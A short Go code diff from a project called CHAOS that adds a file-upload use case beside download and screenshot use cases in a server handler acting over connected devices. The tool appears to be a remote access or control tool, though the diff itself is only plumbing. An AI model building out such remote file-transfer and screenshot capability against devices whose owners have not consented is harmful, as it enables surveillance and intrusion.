@@ -10,6 +10,7 @@ import (
 	"github.com/tiagorlampert/CHAOS/internal/usecase"
 	"github.com/tiagorlampert/CHAOS/internal/usecase/download"
 	"github.com/tiagorlampert/CHAOS/internal/usecase/screenshot"
+	"github.com/tiagorlampert/CHAOS/internal/usecase/upload"
 	"github.com/tiagorlampert/CHAOS/internal/util/network"
 	"github.com/tiagorlampert/CHAOS/internal/util/ui/completer"
 	c "github.com/tiagorlampert/CHAOS/pkg/color"
@@ -143,10 +144,12 @@ func (server *ServerHandler) connect(v []string) {
 
 	// Use Case
 	downloadUseCase := download.NewDownloadUseCase(device.Connection)
+	uploadUseCase := upload.NewUploadUseCase(device.Connection)
 	screenshotUseCase := screenshot.NewScreenshotUseCase(device.Connection)
 
 	useCase := usecase.UseCase{
 		Download:   downloadUseCase,
+		Upload:     uploadUseCase,
 		Screenshot: screenshotUseCase,
 	}
 
